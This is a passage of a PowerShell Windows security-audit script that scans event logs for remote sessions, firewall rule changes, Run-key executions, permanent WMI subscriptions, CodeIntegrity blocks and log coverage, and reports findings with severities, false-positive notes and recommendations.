        New-BvsFinding -Run $run -Check 'remote.sessions' -Title ("Remote session logon/reconnect from {0} address {1} ({2} events)" -f $c, $g.Name, $g.Count) -Severity $(if ($c -eq 'public') { 'high' } else { 'medium' }) -Class suspicious -Confidence medium -Reasons @($(if ($c -eq 'public') { 'public_network' } else { 'remote_access' })) -Expected $exp `
            -Evidence @($g.Group | Select-Object -First 10 | ForEach-Object { [ordered]@{ type = 'event'; id = $_.id; time = $_.timeUtc; user = $_.user; address = $_.address; sessionId = $_.sessionId } }) `
            -Entities @{ network = @(@{ address = $g.Name; class = $c }); accounts = @($g.Group | ForEach-Object user | Sort-Object -Unique | ForEach-Object { @{ name = $_ } }) } `
            -FpNotes 'The user''s own remote access from another of their machines (LAN or Tailscale) is legitimate.' -Recommendation 'Ask the user whether they connected remotely from this address at these times. If not: change the account password and review remote-access settings.' -Mitre @('T1021.001')
    }
    Set-S04CoverageStatus -CheckId 'remote.sessions' -Logs @($lsm, $rcm) -Capped ($r1.Capped -or $r2.Capped)
    $c2 = Get-S04LogCoverage -LogName $rcm
    if ($c2.status -eq 'empty' -and $OsCaption -match '(?i)\bHome\b') { $c2.note = 'Windows Home editions cannot host incoming RDP sessions' }
    @($rows)
}

#endregion

#region ---------- 8. Firewall rule changes ----------

$null = Invoke-BvsCheck -Run $run -Id 'firewall.rule_changes' -Description 'Windows Firewall With Advanced Security/Firewall: rule add/modify/delete events matched by provider + RuleName/ModifyingApplication fields; non-system modifiers flagged' -Script {
    $log = 'Microsoft-Windows-Windows Firewall With Advanced Security/Firewall'
    $r = Get-S04Events -LogName $log -StartUtc $WindowStartUtc
    $actionById = @{ 2004 = 'added'; 2071 = 'added'; 2097 = 'added'; 2005 = 'modified'; 2072 = 'modified'; 2099 = 'modified'; 2006 = 'deleted'; 2073 = 'deleted'; 2052 = 'deleted'; 2033 = 'all_deleted'; 2059 = 'all_deleted' }
    $sysRoot = [regex]::Escape($env:SystemRoot)
    $proxy = [System.Collections.Generic.HashSet[string]]::new([string[]]@($ioc.proxyModifyingApps), [StringComparer]::OrdinalIgnoreCase)
    $codexRx = $null
    $codexItem = Get-S04ExpectedItem 'codex-sandbox-firewall'
    if ($codexItem) { $codexRx = [regex]::new([string]$codexItem.match.nameRegex, $RxOpts, $RxTimeout) }
    $groups = [ordered]@{}
    $counts = @{ system = 0; proxy = 0; application = 0 }
    foreach ($e in $r.Events) {
        if ($e.ProviderName -ne 'Microsoft-Windows-Windows Firewall With Advanced Security') { continue }
        $d = Get-S04EventData $e
        if (-not ($d.Contains('RuleName') -and $d.Contains('ModifyingApplication'))) { continue }
        $app = [string]$d['ModifyingApplication']
        $leaf = if ($app) { Split-Path -Leaf $app } else { '' }
        $kind = if ($app -match "(?i)^$sysRoot\\System32\\svchost\.exe$") { 'system' } elseif ($proxy.Contains($leaf)) { 'proxy' } else { 'application' }
        $counts[$kind]++
        if ($kind -eq 'system') { continue }
        $act = if ($actionById.ContainsKey($e.Id)) { $actionById[$e.Id] } else { "event$($e.Id)" }
        $k = '{0}|{1}|{2}|{3}' -f $act, $d['RuleName'], $app, $d['ApplicationPath']
        $t = $e.TimeCreated.ToUniversalTime()
        if (-not $groups.Contains($k)) {
            $groups[$k] = [ordered]@{ action = $act; ruleName = [string]$d['RuleName']; modifyingApplication = $app; modifierKind = $kind; applicationPath = [string]$d['ApplicationPath']; direction = $(switch ([string]$d['Direction']) { '1' { 'in' } '2' { 'out' } default { [string]$d['Direction'] } }); ruleAction = $(switch ([string]$d['Action']) { '2' { 'block' } '3' { 'allow' } '1' { 'allow_bypass' } default { [string]$d['Action'] } }); profiles = [string]$d['Profiles']; localPorts = [string]$d['LocalPorts']; remoteAddresses = [string]$d['RemoteAddresses']; modifyingUser = [string]$d['ModifyingUser']; count = 0; firstUtc = $t; lastUtc = $t; eventIds = [System.Collections.Generic.HashSet[int]]::new() }
        }
        $g = $groups[$k]; $g.count++; if ($t -lt $g.firstUtc) { $g.firstUtc = $t }; if ($t -gt $g.lastUtc) { $g.lastUtc = $t }; [void]$g.eventIds.Add($e.Id)
    }
    $rows = foreach ($g in $groups.Values) {
        $appPath = [Environment]::ExpandEnvironmentVariables($g.applicationPath)
        $risk = [System.Collections.Generic.List[string]]::new()
        $sig = $null
        if ($g.action -in 'added', 'modified' -and $g.direction -eq 'in' -and $g.ruleAction -like 'allow*') {
            if ($appPath -and [IO.File]::Exists($appPath)) {
                $sig = Get-BvsSignature $appPath
                if (Test-BvsUserWritable $appPath) { $risk.Add('user_writable') }
                if ($sig.Status -ne 'Valid') { $risk.Add($(if ($sig.Status -eq 'NotSigned') { 'unsigned' } else { 'invalid_signature' })) }
            }
            elseif (-not $appPath) { $risk.Add('any_program') }
        }
        $expected = $null
        if ($codexRx -and $codexRx.IsMatch($g.ruleName)) { $expected = [ordered]@{ id = $codexItem.id; reason = $codexItem.reason } }
        elseif ($g.ruleName -match '(?i)^Tailscale' -and (Get-S04ExpectedItem 'tailscale')) { $expected = [ordered]@{ id = 'tailscale'; reason = (Get-S04ExpectedItem 'tailscale').reason } }
        elseif ($g.ruleName -match '(?i)GlideX' -and (Get-S04ExpectedItem 'asus-glidex')) { $expected = [ordered]@{ id = 'asus-glidex'; reason = (Get-S04ExpectedItem 'asus-glidex').reason } }
        [ordered]@{ action = $g.action; ruleName = $g.ruleName; modifyingApplication = $g.modifyingApplication; modifierKind = $g.modifierKind; applicationPath = $g.applicationPath; direction = $g.direction; ruleAction = $g.ruleAction; profiles = $g.profiles; localPorts = $g.localPorts; remoteAddresses = $g.remoteAddresses; count = $g.count; firstUtc = (ConvertTo-S04Iso $g.firstUtc); lastUtc = (ConvertTo-S04Iso $g.lastUtc); eventIds = @($g.eventIds | Sort-Object); appSigner = $(if ($sig) { $sig.Signer }); risk = @($risk); expected = $expected }
    }
    $rows = @($rows | Sort-Object { $_.lastUtc } -Descending)
    Add-BvsInventory -Run $run -Name 'firewallRuleChanges' -Data ([ordered]@{ byModifierKind = $counts; nonSystemChanges = @($rows | Select-Object -First 400) })
    foreach ($x in ($rows | Where-Object { $_.risk.Count -gt 0 -and $_.risk -notcontains 'any_program' -and -not $_.expected })) {
        $sev = if (($x.risk -contains 'user_writable') -and ($x.risk -contains 'unsigned' -or $x.risk -contains 'invalid_signature')) { 'medium' } else { 'low' }
        New-BvsFinding -Run $run -Check 'firewall.rule_changes' -Title ("Inbound allow firewall rule '{0}' for {1} program ({2})" -f $x.ruleName, ($x.risk -join '/'), (Split-Path -Leaf $x.applicationPath)) -Severity $sev -Class $(if ($sev -eq 'medium') { 'suspicious' } else { 'hardening' }) -Confidence low `
            -Reasons @($x.risk + 'exposed_service') -Evidence @([ordered]@{ type = 'event'; log = $log; ids = ($x.eventIds -join '/'); ruleName = $x.ruleName; modifyingApplication = $x.modifyingApplication; applicationPath = $x.applicationPath; direction = $x.direction; action = $x.ruleAction; profiles = $x.profiles; firstUtc = $x.firstUtc; lastUtc = $x.lastUtc; count = $x.count }) `
            -FpNotes 'Dev tools (node, python, game servers) installed per-user get inbound rules when the user clicks Allow.' -Recommendation 'Confirm the program is wanted and needs inbound access; prefer Private-profile-only rules.' -Mitre @('T1562.004')
    }
    $added = @($rows | Where-Object { $_.action -in 'added', 'modified' })
    if ($added.Count -gt 0) {
        New-BvsFinding -Run $run -Check 'firewall.rule_changes' -Title ("{0} firewall rule(s) added/changed by non-system processes" -f $added.Count) -Severity info -Class info -Confidence high `
            -Evidence @($added | Select-Object -First 30 | ForEach-Object { [ordered]@{ type = 'event'; log = $log; ruleName = $_.ruleName; modifier = $_.modifyingApplication; app = $_.applicationPath; direction = $_.direction; action = $_.ruleAction; count = $_.count; lastUtc = $_.lastUtc; expected = $(if ($_.expected) { $_.expected.id }) } }) `
            -FpNotes 'Installers and services (Tailscale via netsh, Edge/Chrome setup, ASUS) maintain their own rules. Listed for the timeline.' -Recommendation 'Review names you do not recognise.' -Mitre @('T1562.004')
    }
    Set-S04CoverageStatus -CheckId 'firewall.rule_changes' -Logs @($log) -Capped $r.Capped
    $rows
}

#endregion

#region ---------- 9. Other logs ----------

function ConvertTo-S04NormCmd { param([string]$Text) (($Text -replace '\s+', ' ').Trim()).ToLowerInvariant() }

$null = Invoke-BvsCheck -Run $run -Id 'shellcore.run_exec' -Description 'Shell-Core/Operational 9707/9708: Run/RunOnce commands executed at logon, compared with the current Run keys' -Script {
    $log = 'Microsoft-Windows-Shell-Core/Operational'
    $r = Get-S04Events -LogName $log -Id 9707, 9708 -StartUtc $WindowStartUtc
    $runKeys = @(
        'HKCU\Software\Microsoft\Windows\CurrentVersion\Run', 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run', 'HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run', 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run')
    $exeLeafRx = [regex]::new('([^\\/"]+?\.(?:exe|com|bat|cmd|vbs|js|ps1|scr|lnk))\b', $RxOpts, $RxTimeout)
    $current = foreach ($k in $runKeys) {
        foreach ($v in @(Get-BvsRegValues -Path $k)) {
            $raw = [string]$v.Value
            if (-not $raw) { continue }
            foreach ($form in (@($raw, [Environment]::ExpandEnvironmentVariables($raw)) | Sort-Object -Unique)) {
                $tail = $form.Substring($form.LastIndexOf('\') + 1)
                $lm = $exeLeafRx.Match($tail)
                [pscustomobject]@{ key = $k; name = $v.Name; tail = (ConvertTo-S04NormCmd $tail); leaf = $(if ($lm.Success) { $lm.Groups[1].Value.ToLowerInvariant() } else { $null }) }
            }
        }
    }
    $current = @($current)
    $selfDel = @($ioc.runOnceSelfDeletingPatterns | ForEach-Object { [regex]::new([string]$_, $RxOpts, $RxTimeout) })
    $cmds = [ordered]@{}
    $finished = 0
    foreach ($e in $r.Events) {
        if ($e.Id -eq 9708) { $finished++; continue }
        $d = Get-S04EventData $e
        $c = [string]$d['Command']
        if (-not $c) { continue }
        $t = $e.TimeCreated.ToUniversalTime()
        if (-not $cmds.Contains($c)) { $cmds[$c] = [ordered]@{ count = 0; first = $t; last = $t } }
        $x = $cmds[$c]; $x.count++; if ($t -lt $x.first) { $x.first = $t }; if ($t -gt $x.last) { $x.last = $t }
    }
    $startupKnown = Get-S04ExpectedItem 'startup-known'
    $rows = foreach ($kv in $cmds.GetEnumerator()) {
        $c = $kv.Key; $x = $kv.Value
        $n = ConvertTo-S04NormCmd $c
        $lm = $exeLeafRx.Match($c); $leaf = if ($lm.Success) { $lm.Groups[1].Value.ToLowerInvariant() } else { $null }
        $hit = $current | Where-Object { $_.tail -eq $n } | Select-Object -First 1
        $status = 'present'
        if (-not $hit -and $leaf) { $hit = $current | Where-Object { $_.leaf -eq $leaf } | Select-Object -First 1; if ($hit) { $status = 'present_changed_args' } }
        if (-not $hit) { $status = if (@($selfDel | Where-Object { $_.IsMatch($c) }).Count -gt 0) { 'runonce_expected' } else { 'gone' } }
        $cls = Get-S04Classification -Text $c -Vector runkey
        if ($cls -and $cls.Severity -and $cls.Severity -ne 'info') { $CmdRecords.Add((New-S04CommandRecord -Classification $cls -Vector runkey -Source $log -SourcePath $log -Locator '9707' -TimeUtc $x.last -Text $c -Count $x.count)) }
        [ordered]@{ command = (Protect-S04Line $c 300); count = $x.count; firstUtc = (ConvertTo-S04Iso $x.first); lastUtc = (ConvertTo-S04Iso $x.last); status = $status; matchedKey = $(if ($hit) { $hit.key }); matchedName = $(if ($hit) { $hit.name }); patterns = @($cls.Hits) }
    }
    $rows = @($rows | Sort-Object { $_.lastUtc } -Descending)
    Add-BvsInventory -Run $run -Name 'runKeyExecutions' -Data ([ordered]@{ note = 'Shell-Core logs only the command tail after the last backslash; matching is done on that tail and on the executable name.'; finishedEvents9708 = $finished; commands = $rows })
    $gone = @($rows | Where-Object status -eq 'gone')
    foreach ($g in $gone) {
        $knownName = $false
        if ($startupKnown) { foreach ($nm in @($startupKnown.match.names)) { $pat = [regex]::Escape(([string]$nm -replace '\*$', '')); if ($g.command -match "(?i)$pat") { $knownName = $true } } }
        New-BvsFinding -Run $run -Check 'shellcore.run_exec' -Title ("Run/RunOnce command ran at logon but is no longer in the Run keys: {0}" -f $g.command) -Severity $(if ($knownName) { 'info' } else { 'low' }) -Class $(if ($knownName) { 'info' } else { 'suspicious' }) -Confidence low -Reasons @('persistence', 'removed_entry') `
            -Evidence @([ordered]@{ type = 'event'; log = $log; id = 9707; command = $g.command; count = $g.count; firstUtc = $g.firstUtc; lastUtc = $g.lastUtc }) `
            -FpNotes 'RunOnce entries delete themselves after running, and uninstalled or updated apps remove their Run entries. Malware sometimes removes its own Run entry after the first start to hide.' `
            -Recommendation 'Identify the program from the command tail; confirm it was uninstalled/updated by the user. If unknown, look for the executable on disk and check its signature.' -Mitre @('T1547.001')
    }
    Set-S04CoverageStatus -CheckId 'shellcore.run_exec' -Logs @($log) -Capped $r.Capped
    $rows
}
Add-S04CommandFindings -Records @($CmdRecords | Where-Object vector -eq 'runkey') -Check 'shellcore.run_exec'

$null = Invoke-BvsCheck -Run $run -Id 'wmi.activity' -Description 'WMI-Activity/Operational 5857-5861 (5861 = permanent event subscription bound; 5860 = temporary subscription; 5857 = provider loaded)' -Script {
    $log = 'Microsoft-Windows-WMI-Activity/Operational'
    $r = Get-S04Events -LogName $log -Id 5857, 5858, 5859, 5860, 5861 -StartUtc $WindowStartUtc
    $benign = [System.Collections.Generic.HashSet[string]]::new([string[]]@($ioc.benignWmiConsumers), [StringComparer]::OrdinalIgnoreCase)
    $perm = [ordered]@{}; $temp = [ordered]@{}; $prov = [ordered]@{}
    foreach ($e in $r.Events) {
        $d = Get-S04EventData $e
        $t = $e.TimeCreated.ToUniversalTime()
        switch ($e.Id) {
            5861 {
                $k = '{0}|{1}' -f $d['Namespace'], $d['CONSUMER']
                if (-not $perm.Contains($k)) { $perm[$k] = [ordered]@{ namespace = [string]$d['Namespace']; consumer = [string]$d['CONSUMER']; filter = (Protect-S04Line ([string]$d['ESS']) 300); possibleCause = (Protect-S04Line ([string]$d['PossibleCause']) 500); count = 0; firstUtc = $t; lastUtc = $t } }
                $p = $perm[$k]; $p.count++; if ($t -lt $p.firstUtc) { $p.firstUtc = $t }; if ($t -gt $p.lastUtc) { $p.lastUtc = $t }
            }
            5860 {
                $k = '{0}|{1}' -f $d['NamespaceName'], $d['Query']
                if (-not $temp.Contains($k)) { $temp[$k] = [ordered]@{ namespace = [string]$d['NamespaceName']; query = (Protect-S04Line ([string]$d['Query']) 300); user = [string]$d['User']; count = 0; lastUtc = $t } }
                $temp[$k].count++; if ($t -gt $temp[$k].lastUtc) { $temp[$k].lastUtc = $t }
            }
            5857 {
                $k = '{0}|{1}' -f $d['ProviderName'], $d['ProviderPath']
                if (-not $prov.Contains($k)) { $prov[$k] = [ordered]@{ provider = [string]$d['ProviderName']; providerPath = [string]$d['ProviderPath']; hostProcess = [string]$d['HostProcess']; count = 0 } }
                $prov[$k].count++
            }
        }
    }
    $permRows = @($perm.Values | ForEach-Object { $_.firstUtc = ConvertTo-S04Iso $_.firstUtc; $_.lastUtc = ConvertTo-S04Iso $_.lastUtc; $_.benign = $benign.Contains($_.consumer); $_ })
    $provRows = @($prov.Values | ForEach-Object {
            $pp = [Environment]::ExpandEnvironmentVariables(($_.providerPath -replace '^\\\?\?\\', ''))
            $_.userWritable = $(if ($pp -and $pp -match '^[a-zA-Z]:\\') { Test-BvsUserWritable $pp } else { $null }); $_ })
    Add-BvsInventory -Run $run -Name 'wmiActivity' -Data ([ordered]@{
            counts = @($r.Events | Group-Object Id | ForEach-Object { [ordered]@{ id = [int]$_.Name; count = $_.Count } })
            permanentBindings = $permRows; temporarySubscriptions = @($temp.Values | ForEach-Object { $_.lastUtc = ConvertTo-S04Iso $_.lastUtc; $_ } | Select-Object -First 100)
            providerLoads = @($provRows | Sort-Object { $_.count } -Descending | Select-Object -First 50)
        })
    foreach ($p in ($permRows | Where-Object { -not $_.benign })) {
        $active = $p.consumer -match '(?i)^(CommandLineEventConsumer|ActiveScriptEventConsumer)'
        New-BvsFinding -Run $run -Check 'wmi.activity' -Title ("Permanent WMI event subscription bound: {0}" -f $p.consumer) -Severity $(if ($active) { 'high' } else { 'medium' }) -Class suspicious -Confidence medium -Reasons @('persistence') `
            -Evidence @([ordered]@{ type = 'event'; log = $log; id = 5861; namespace = $p.namespace; consumer = $p.consumer; filter = $p.filter; possibleCause = $p.possibleCause; count = $p.count; firstUtc = $p.firstUtc; lastUtc = $p.lastUtc }) `
            -FpNotes 'Some OEM/management software uses permanent WMI subscriptions; 5861 is also re-logged for existing bindings when the WMI service starts.' -Recommendation 'Compare with the current root\subscription filters/consumers (persistence collector). Script or command-line consumers from unknown software are a classic fileless persistence technique.' -Mitre @('T1546.003')
    }
    foreach ($p in ($provRows | Where-Object { $_.userWritable })) {
        New-BvsFinding -Run $run -Check 'wmi.activity' -Title ("WMI provider loaded from a user-writable path: {0}" -f $p.provider) -Severity medium -Class suspicious -Confidence low -Reasons @('user_writable', 'persistence') `
            -Evidence @([ordered]@{ type = 'event'; log = $log; id = 5857; provider = $p.provider; providerPath = $p.providerPath; hostProcess = $p.hostProcess; count = $p.count }) `
            -FpNotes 'Rare but some per-user tools register WMI providers.' -Recommendation 'Check the DLL''s signature and owner.' -Mitre @('T1546.003')
    }
    Set-S04CoverageStatus -CheckId 'wmi.activity' -Logs @($log) -Capped $r.Capped
    @($permRows)
}

$null = Invoke-BvsCheck -Run $run -Id 'codeintegrity.events' -Description 'CodeIntegrity/Operational 3033/3063: images that did not meet the signing level (info)' -Script {
    $log = 'Microsoft-Windows-CodeIntegrity/Operational'
    $r = Get-S04Events -LogName $log -Id 3033, 3063 -StartUtc $WindowStartUtc
    $pairs = [ordered]@{}
    foreach ($e in $r.Events) {
        $d = Get-S04EventData $e
        $f = ([string]$d['FileNameBuffer']) -replace '^\\Device\\HarddiskVolume\d+', '<vol>'
        $p = ([string]$d['ProcessNameBuffer']) -replace '^\\Device\\HarddiskVolume\d+', '<vol>'
        $k = "$($e.Id)|$p|$f"
        $t = $e.TimeCreated.ToUniversalTime()
        if (-not $pairs.Contains($k)) { $pairs[$k] = [ordered]@{ id = $e.Id; process = $p; file = $f; count = 0; firstUtc = $t; lastUtc = $t; requestedPolicy = [string]$d['RequestedPolicy']; validatedPolicy = [string]$d['ValidatedPolicy'] } }
        $x = $pairs[$k]; $x.count++; if ($t -lt $x.firstUtc) { $x.firstUtc = $t }; if ($t -gt $x.lastUtc) { $x.lastUtc = $t }
    }
    $rows = @($pairs.Values | Sort-Object { $_.count } -Descending | ForEach-Object { $_.firstUtc = ConvertTo-S04Iso $_.firstUtc; $_.lastUtc = ConvertTo-S04Iso $_.lastUtc; $_.userWritablePath = [bool]($_.file -match '(?i)\\Users\\[^\\]+\\(?:AppData|Downloads|Desktop)\\|\\Temp\\|\\Users\\Public\\'); $_ })
    Add-BvsInventory -Run $run -Name 'codeIntegrity' -Data ([ordered]@{ events = $r.Events.Count; pairs = @($rows | Select-Object -First 60) })
    if ($rows.Count -gt 0) {
        New-BvsFinding -Run $run -Check 'codeintegrity.events' -Title ("CodeIntegrity blocked/flagged {0} image load(s) ({1} distinct process/file pairs)" -f $r.Events.Count, $rows.Count) -Severity info -Class info -Confidence high `
            -Evidence @($rows | Select-Object -First 15 | ForEach-Object { [ordered]@{ type = 'event'; log = $log; id = $_.id; process = $_.process; file = $_.file; count = $_.count; lastUtc = $_.lastUtc; userWritablePath = $_.userWritablePath } }) `
            -FpNotes 'Usually third-party DLLs (AV, overlays, shell extensions) rejected by a protected process (LSA protection, Office, Edge). Informational.' -Recommendation 'None unless a file in AppData/Temp is being loaded into a protected system process.'
    }
    Set-S04CoverageStatus -CheckId 'codeintegrity.events' -Logs @($log) -Capped $r.Capped
    $rows
}

$null = Invoke-BvsCheck -Run $run -Id 'taskscheduler.operational' -Description 'TaskScheduler/Operational availability (task execution history; often disabled by default)' -Script {
    $log = 'Microsoft-Windows-TaskScheduler/Operational'
    $c = Get-S04LogCoverage -LogName $log
    if ($c.status -in 'disabled', 'missing', 'empty') {
        $c.note = 'coverage gap: no scheduled-task execution history (log ' + $c.status + ')'
        Set-BvsCheckStatus -Id 'taskscheduler.operational' -Status not_applicable -Reason "TaskScheduler/Operational is $($c.status): no task-execution history (coverage gap; current tasks are covered by the persistence collector)"
        return
    }
    $r = Get-S04Events -LogName $log -Id 106, 140, 141, 200, 201 -StartUtc $WindowStartUtc
    $rows = @($r.Events | Group-Object Id | ForEach-Object { [ordered]@{ id = [int]$_.Name; count = $_.Count } })
    Add-BvsInventory -Run $run -Name 'taskSchedulerEvents' -Data $rows
    Set-S04CoverageStatus -CheckId 'taskscheduler.operational' -Logs @($log) -Capped $r.Capped
    $rows
}

$null = Invoke-BvsCheck -Run $run -Id 'logs.security' -Description 'Security log access (1102 clears, 4624/4688 etc. need elevation; covered by admin\windows\admin-checks.ps1)' -Script {
    $c = Get-S04LogCoverage -LogName 'Security'
    if ($c.status -eq 'needs_admin') { $c.note = 'not readable without elevation: covered by admin\windows\admin-checks.ps1'; Set-BvsCheckStatus -Id 'logs.security' -Status needs_admin -Reason 'Security log requires elevation (covered by the admin checks)' }
    elseif ($run.Elevated) { $c.note = 'readable (elevated run); S04 does not parse it: covered by the admin checks' }
    @()
}

#endregion

#region ---------- 10. Log coverage ----------

$null = Invoke-BvsCheck -Run $run -Id 'logs.coverage' -Description 'Record count, size, oldest/newest event, enabled state and window coverage for every log queried' -Script {
    $statements = [System.Collections.Generic.List[string]]::new()
    $rows = foreach ($c in $script:Coverage.Values) {
        $short = $c.log -replace '^Microsoft-Windows-', ''
        $maxMb = if ($c.maxSizeBytes) { [math]::Round($c.maxSizeBytes / 1MB, 0) } else { $null }
        switch ($c.status) {
            'ok' {
                $rolling = if ($c.isFull -and $c.postAuditEvents -gt 0) { (' Warning: the log is full and still rolling over during this scan ({0} post-audit events), so a later re-run will see less history.' -f $c.postAuditEvents) } else { '' }
                if ($c.newestUtc -and $c.newestUtc -lt $WindowStartUtc) { $statements.Add(('{0}: enabled, but nothing was logged in the {1}-day window (newest event {2:yyyy-MM-dd}, history since {3:yyyy-MM-dd}).' -f $short, $Days, $c.newestUtc, $c.oldestUtc)) }
                elseif ($c.coversWindow) { $statements.Add(('{0}: events from {1:yyyy-MM-dd} ({2} days before the audit start) to {3:yyyy-MM-dd}; the {4}-day window is fully covered.{5}' -f $short, $c.oldestUtc, $c.preAuditDays, $c.newestUtc, $Days, $rolling)) }
                else { $statements.Add(('{0} only goes back to {1:yyyy-MM-dd} ({2} of {3} days){4}.{5}' -f $short, $c.oldestUtc, $c.preAuditDays, $Days, $(if ($c.isFull) { "; the log is at its size limit ($maxMb MB), so older events were overwritten" } else { '' }), $rolling)) }
            }
            'overwritten_by_audit' { $statements.Add(('{0} holds only events written after the audit started (oldest {1:yyyy-MM-dd HH:mm}Z, {2} post-audit events, log full at {3} MB): its pre-audit history was overwritten, most likely by this scan''s own PowerShell activity.' -f $short, $c.oldestUtc, $c.postAuditEvents, $maxMb)) }
            'disabled' { $statements.Add("$short is disabled: no history available.") }
            'empty' { $statements.Add("$short is enabled but empty$(if ($c.note) { ' (' + $c.note + ')' }).") }
            'needs_admin' { $statements.Add("$short needs elevation (covered by the admin checks).") }
            'missing' { $statements.Add("$short does not exist on this system.") }
        }
        [ordered]@{
            log = $c.log; status = $c.status; enabled = $c.enabled; recordCount = $c.recordCount; fileSizeBytes = $c.fileSizeBytes; maxSizeBytes = $c.maxSizeBytes
            logMode = $c.logMode; isFull = $c.isFull; oldestUtc = (ConvertTo-S04Iso $c.oldestUtc); newestUtc = (ConvertTo-S04Iso $c.newestUtc); preAuditDays = $c.preAuditDays
            coversWindow = $c.coversWindow; windowDays = $c.windowDays; queriedIds = @($c.queriedIds); eventsUsed = $c.eventsUsed; postAuditEventsExcluded = $c.postAuditEvents; note = $c.note
        }
    }
    $rows = @($rows)
    Add-BvsInventory -Run $run -Name 'logCoverage' -Data $rows
    Add-BvsInventory -Run $run -Name 'logCoverageStatements' -Data @($statements)
    Add-BvsInventory -Run $run -Name 'auditWindow' -Data ([ordered]@{ auditStartUtc = (ConvertTo-S04Iso $AuditUtc); windowStartUtc = (ConvertTo-S04Iso $WindowStartUtc); days = $Days; maxEventsPerQuery = $MaxEvents; rule = 'Only events strictly before auditStartUtc are used; later events are this scan''s own activity.' })
    $rows
}

#endregion

$summary = Complete-BvsRun -Run $run
$bySev = @($run.Findings | Group-Object severity | ForEach-Object { "$($_.Name)=$($_.Count)" }) -join ', '
"S04 complete: {0} findings [{1}], {2} checks, {3} errors -> {4}" -f $summary.Findings, $bySev, $summary.Checks, $summary.Errors, $summary.Path
foreach ($c in $run.Checks) { "  {0,-28} {1,-15} items={2,-5} {3,6} ms {4}" -f $c.id, $c.status, $c.items, $c.ms, $(if ($c.reason) { Protect-BvsText ([string]$c.reason).Substring(0, [Math]::Min(110, ([string]$c.reason).Length)) }) }
